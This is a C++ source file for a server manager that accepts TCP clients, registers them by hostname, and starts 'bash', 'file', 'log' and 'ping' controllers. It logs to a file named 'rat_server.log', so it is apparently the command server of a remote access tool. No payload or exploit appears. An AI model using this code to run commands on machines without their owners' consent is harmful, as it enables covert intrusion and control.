#include "ServerManager.hpp"
#include "ServerCommandController.hpp"
#include "ServerLogController.hpp"
#include "ServerPingController.hpp"
#include "ServerFileController.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <fstream>

namespace Server {





std::shared_ptr<ServerManager> ServerManager::getInstance() {
    if (!ServerManager::instance) {
        std::lock_guard<std::mutex> lock(ServerManager::initMutex);
        if (!ServerManager::instance) ServerManager::instance.reset(new ServerManager());
    }
    return ServerManager::instance;
}

ServerManager::ServerManager() {
    clientManagement_ = std::make_unique<ClientManagement>(this);
}

ServerManager::~ServerManager() {
    stop();
    
    std::lock_guard<std::mutex> lock(mtx_);
    cleanupResources();
}





bool ServerManager::start(unsigned short port) {
    unsigned short localPort = 0;
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        if (running_) return false;
        
        
        listener_ = std::make_unique<Utils::TCPSocket>();
        if (!listener_->bind(port)) {
            std::cerr << "Failed to bind port " << port << std::endl;
            listener_.reset();
            return false;
        }
        
        port_ = port;
        localPort = port;
        running_ = true;
        std::cout << "Server started successfully on port " << port << std::endl;
    }
    
    
    initializeControllers(localPort);
    
    return true;
}


void ServerManager::stop() {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (!running_) return;
    
    running_ = false;
    
    
    if (listener_) {
        listener_->close();
        listener_.reset();
    }
    
    port_ = 0;
}

bool ServerManager::isRunning() const {
    
    std::lock_guard<std::mutex> lock(mtx_);
    return running_;
}

int ServerManager::run(unsigned short port) {
    if (!start(port)) {
        return 1;
    }
    
    int unknownCount = 0;
    Utils::TCPSocket* listenerPtr = nullptr;
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        listenerPtr = listener_.get();
    }
    
    
    while (isRunning()) {
        if (!listenerPtr) break;
        
        auto client = listenerPtr->accept();
        if (!client) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        handleNewClientConnection(std::move(client), unknownCount);
    }
    
    return 0;
}





bool ServerManager::addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket) {
    return clientManagement_ ? clientManagement_->addClient(deviceName, std::move(socket)) : false;
}

bool ServerManager::removeClient(const std::string &deviceName) {
    return clientManagement_ ? clientManagement_->removeClient(deviceName) : false;
}

Utils::TCPSocket *ServerManager::getClient(const std::string &deviceName) {
    return clientManagement_ ? clientManagement_->getClient(deviceName) : nullptr;
}





IController *ServerManager::getSystemController(const std::string &handle) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = controllers_.find(handle);
    return (it != controllers_.end()) ? it->second.get() : nullptr;
}





bool ServerManager::sendRequest(const std::string& clientName, const nlohmann::json& request) {
    if (!clientManagement_) return false;
    
    auto* client = clientManagement_->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr = request.dump();
    
    
    pushLog("→ " + clientName + ": " + jsonStr);
    
    return client->send(jsonStr);
}

bool ServerManager::receiveResponse(const std::string& clientName, nlohmann::json& response, int timeoutMs) {
    (void)timeoutMs; 
    
    if (!clientManagement_) return false;
    
    auto* client = clientManagement_->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr;
    if (client->receive(jsonStr)) {
        try {
            response = nlohmann::json::parse(jsonStr);
            
            
            pushLog("← " + clientName + ": " + jsonStr);
            
            return true;
        } catch (const std::exception& e) {
            std::cerr << "Failed to parse response: " << e.what() << std::endl;
        }
    }
    return false;
}





void ServerManager::pushLog(const std::string &msg) {
    std::lock_guard<std::mutex> lock(logMtx_);
    logs_.push(msg);
    
    if (logPath_.empty()) logPath_ = "/tmp/rat_server.log";
    try {
        std::ofstream ofs(logPath_, std::ios::app);
        if (ofs) ofs << msg << std::endl;
    } catch (...) {}
}

bool ServerManager::popLog(std::string &out) {
    std::lock_guard<std::mutex> lock(logMtx_);
    if (logs_.empty()) return false;
    out = std::move(logs_.front());
    logs_.pop();
    return true;
}





std::vector<std::string> ServerManager::listClients() {
    return clientManagement_ ? clientManagement_->listClients() : std::vector<std::string>();
}

std::string ServerManager::getClientIP(const std::string &name) {
    return clientManagement_ ? clientManagement_->getClientIP(name) : "unknown";
}

bool ServerManager::hasClient(const std::string &name) {
    return clientManagement_ ? clientManagement_->hasClient(name) : false;
}





void ServerManager::initializeControllers(unsigned short port) {
    
    
    
    controllers_.emplace("log", std::make_unique<ServerLogController>(this));
    if (auto it = controllers_.find("log"); it != controllers_.end()) {
        it->second->start();
    }
    
    
    controllers_.emplace("bash", std::make_unique<ServerCommandController>(this));
    if (auto it = controllers_.find("bash"); it != controllers_.end()) {
        it->second->start();
    }
    
    
    controllers_.emplace("file", std::make_unique<ServerFileController>(this));
    if (auto it = controllers_.find("file"); it != controllers_.end()) {
        it->second->start();
    }
    
    
    auto pingController = std::make_unique<ServerPingController>(this);
    if (pingController->startUdpResponder(port)) {
        controllers_.emplace("ping", std::move(pingController));
    } else {
        std::cerr << "Warning: Failed to start UDP ping responder" << std::endl;
    }
}

void ServerManager::cleanupResources() {
    
    for (auto &[name, controller] : controllers_) {
        if (controller) {
            controller->stop();
        }
    }
    controllers_.clear();
    
    
    if (clientManagement_) {
        clientManagement_->cleanup();
    }
}

void ServerManager::handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount) {
    if (!client) return;
    
    
    client->setBlocking(true);
    
    
    std::string deviceName;
    std::string jsonStr;
    
    if (client->receive(jsonStr)) {
        try {
            nlohmann::json initMsg = nlohmann::json::parse(jsonStr);
            if (initMsg.contains("hostname") && initMsg["hostname"].is_string()) {
                deviceName = initMsg["hostname"].get<std::string>();
            }
        } catch (const std::exception& e) {
            std::cerr << "Handshake parse error: " << e.what() << std::endl;
            pushLog("Failed to parse handshake from " + client->getRemoteAddress());
        }
    } else {
        std::cerr << "Failed to receive handshake from " << client->getRemoteAddress() << std::endl;
        return;
    }
    
    
    if (deviceName.empty()) {
        deviceName = "unknown" + std::to_string(++unknownCount);
    }
    
    
    int counter = unknownCount;
    if (clientManagement_) {
        deviceName = clientManagement_->generateUniqueDeviceName(deviceName, counter);
        unknownCount = counter;
    }
    
    
    if (clientManagement_) {
        if (!clientManagement_->addClient(deviceName, std::move(client))) {
            std::cerr << "Failed to register client: " << deviceName << std::endl;
        }
    }
}


} 
